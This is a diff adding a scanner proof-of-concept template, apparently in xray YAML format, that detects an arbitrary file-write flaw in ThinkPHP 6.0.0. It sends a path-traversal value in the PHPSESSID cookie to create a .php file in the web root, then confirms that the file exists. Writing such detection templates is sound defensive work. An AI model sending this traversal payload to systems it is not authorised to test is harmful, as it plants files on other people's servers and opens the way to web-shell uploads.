@@ -1,0 +1,26 @@
+name: poc-yaml-thinkphp-v6-file-write
+set:
+  f1: randomInt(800000000, 900000000)
+rules:
+  - method: GET
+    path: /{{f1}}.php
+    follow_redirects: true
+    expression: |
+      response.status == 404
+  - method: GET
+    path: /
+    headers:
+      Cookie: PHPSESSID=../../../../public/{{f1}}.php
+    follow_redirects: true
+    expression: |
+      response.status == 200 && "set-cookie" in response.headers && response.headers["set-cookie"].contains(string(f1))
+  - method: GET
+    path: /{{f1}}.php
+    follow_redirects: true
+    expression: |
+      response.status == 200 && response.content_type.contains("text/html")
+detail:
+  author: Loneyer
+  Affected Version: "Thinkphp 6.0.0"
+  links:
+    - https://github.com/Loneyers/ThinkPHP6_Anyfile_operation_write
